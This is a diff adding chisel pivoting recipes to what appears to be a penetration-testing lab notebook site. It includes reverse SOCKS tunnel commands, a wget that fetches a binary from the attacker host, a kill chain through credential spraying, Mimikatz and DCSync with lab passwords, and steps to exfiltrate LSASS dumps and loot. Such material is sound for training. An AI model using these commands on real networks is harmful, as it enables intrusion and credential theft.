@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=chisel) · [All tools](/index)
+
 ## Commands
 
 **Kali and pivot**
@@ -26,8 +28,199 @@ Replace UPPER_CASE values with your lab values.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=chisel)
+## Notebook recipes
 
-## Learning and original examples
+11 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Chisel: Quick Tunnel Reference](/pivoting/chisel)
+<AccordionGroup>
+
+<Accordion title="Option A — chisel + proxychains (SOCKS)">
+
+### Option A — chisel + proxychains (SOCKS)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# Kali (attacker)
+./chisel server -p 9001 --reverse
+# DMZ01 (pull binary via your http server first)
+wget http://<KALI>:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+/tmp/chisel client <KALI>:9001 R:1080:socks
+# Kali: /etc/proxychains4.conf  ->  socks5 127.0.0.1 1080
+proxychains nxc smb 172.16.119.11 -u user -p pass
+```
+
+</Accordion>
+
+<Accordion title="🗺️ The kill chain (this assessment)">
+
+### 🗺️ The kill chain (this assessment)
+
+**Active Directory Attack Path: Worked Lab**
+
+```text
+OSINT (Betty Jayde)
+   ↓  namebuster  → username list
+Password spraying (Hydra, SSH)
+   ↓  jbetty : Texas123!@#
+SSH foothold (DMZ01)
+   ↓  chisel / ligolo pivot into 172.16.119.0/24
+Credential discovery (.bash_history)
+   ↓  hwilliam : dealer-screwed-gym1
+SMB share looting (FILE01)
+   ↓  Employee-Passwords_OLD.psafe3
+Crack the vault (pwsafe2john + john)
+   ↓  bdavid, stom (OLD), hwilliam
+BloodHound → bdavid = local admin on JUMP01 ; stom ∈ Domain Admins
+   ↓
+RDP to JUMP01 as bdavid (local admin)
+   ↓  SeImpersonate → SYSTEM  (PrintSpoofer / GodPotato)
+Mimikatz → LSASS → stom's CURRENT password
+   ↓  stom : calves-warp-learning1  (Domain Admin)
+DCSync against DC01
+   ↓  Administrator NTLM + krbtgt
+FULL DOMAIN COMPROMISE
+```
+
+</Accordion>
+
+<Accordion title="Chisel: Quick Tunnel Reference">
+
+### Chisel: Quick Tunnel Reference
+
+**Chisel: Quick Tunnel Reference**
+
+```bash
+# Attacker = server (reverse SOCKS)
+./chisel server -p 8080 --reverse
+# Victim = client, opens a reverse SOCKS5 proxy back to you
+./chisel client ATTACKER:8080 R:socks
+# then route tools through 127.0.0.1:1080
+proxychains nxc smb 172.16.5.0/24
+```
+
+**Chisel: Quick Tunnel Reference**
+
+```bash
+# Single remote port -> your localhost
+./chisel client ATTACKER:8080 R:3389:172.16.5.19:3389
+```
+
+</Accordion>
+
+<Accordion title="Step 1 — Build a SOCKS tunnel through the pivot (chisel)">
+
+### Step 1 — Build a SOCKS tunnel through the pivot (chisel)
+
+**Pass the Ticket from Linux**
+
+```bash
+# On YOUR attack host — start the chisel server (reverse mode)
+./chisel server --reverse        # listens on 8080, opens a SOCKS proxy on 1080 when a client connects
+```
+
+</Accordion>
+
+<Accordion title="Step 2 — Route tools through the proxy (proxychains)">
+
+### Step 2 — Route tools through the proxy (proxychains)
+
+**Pass the Ticket from Linux**
+
+```text
+[ProxyList]
+# socks4  127.0.0.1 9050      ← comment out the default Tor line
+socks5  127.0.0.1 1080        ← add chisel's SOCKS port
+```
+
+</Accordion>
+
+<Accordion title="2. chisel (SOCKS + port forwards)">
+
+### 2. chisel (SOCKS + port forwards)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# Kali (server, reverse mode)
+./chisel server -p 9001 --reverse
+# pivot host (client) — reverse SOCKS:
+./chisel client <KALI_IP>:9001 R:1080:socks
+#   -> SOCKS5 on Kali 127.0.0.1:1080 ; use proxychains
+
+# single reverse port forward (e.g. expose internal RDP on Kali:13389):
+./chisel client <KALI_IP>:9001 R:13389:172.16.119.7:3389
+
+# forward a Kali service INTO the network (internal host can reach Kali:8000):
+./chisel client <KALI_IP>:9001 R:172.16.119.13:8000:127.0.0.1:8000
+```
+
+</Accordion>
+
+<Accordion title="Pulling files FROM the target to Kali (the hard direction)">
+
+### Pulling files FROM the target to Kali (the hard direction)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# 1) evil-winrm has it built in (pulls over your existing session):
+*Evil-WinRM* PS> download C:\Temp\lsass.dmp /home/kali/loot/lsass.dmp
+*Evil-WinRM* PS> upload /home/kali/tools/PrintSpoofer64.exe   # the reverse
+
+# 2) Stage through the DMZ (a host the internal box CAN reach):
+#    run smbserver on DMZ01, push from internal host, then SSH-pull DMZ->Kali
+impacket-smbserver share /tmp -smb2support -username u -password p     # ON DMZ01
+#    on the internal host:
+net use \\172.16.119.13\share /user:u p
+copy C:\Temp\loot.zip \\172.16.119.13\share\
+#    DMZ -> Kali:
+scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
+
+# 3) Reverse forward (ligolo listener_add or chisel/ssh -R), then smbserver/nc ON Kali
+#    becomes reachable from inside, push to it normally.
+
+# 4) base64 paste (small files / when nothing else works):
+#    Windows:  [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\x")) | clip
+#    Kali:     echo '<paste>' | base64 -d > x
+```
+
+</Accordion>
+
+<Accordion title="Step 3 — Verify the tunnel is actually up">
+
+### Step 3 — Verify the tunnel is actually up
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: If it's empty, the tunnel isn't established — make sure  ./chisel server --reverse  is still running on Kali  and  the  chisel.exe client ... R:socks  on MS01 prints  "Connected"  (not retrying).
+
+```text
+./chisel server --reverse
+```
+
+</Accordion>
+
+<Accordion title="⏱️ DECISION HEADER — &quot;I need to… → do…&quot;">
+
+### ⏱️ DECISION HEADER — "I need to… → do…"
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+Context from the notebook: Pivot but there's  no SSH  on the host chisel  (SOCKS/forward over HTTP) chisel server --reverse  /  chisel client … R:socks
+
+```text
+chisel server --reverse
+```
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+Context from the notebook: Pivot but there's  no SSH  on the host chisel  (SOCKS/forward over HTTP) chisel server --reverse  /  chisel client … R:socks
+
+```text
+chisel client … R:socks
+```
+
+</Accordion>
+
+</AccordionGroup>
